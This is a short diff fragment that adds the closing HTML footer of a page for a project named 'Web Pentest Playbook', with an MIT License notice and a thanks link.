+      </div>
+    </div>
+    <div class="footer-bottom">
+      <span>© 2025 Web Pentest Playbook · MIT License</span>
+      <span>Inspired by <a href="../thanks.html">Tomer Hadad</a></span>
+    </div>
+  </div>
+</footer>
+
+</body>
+</html>
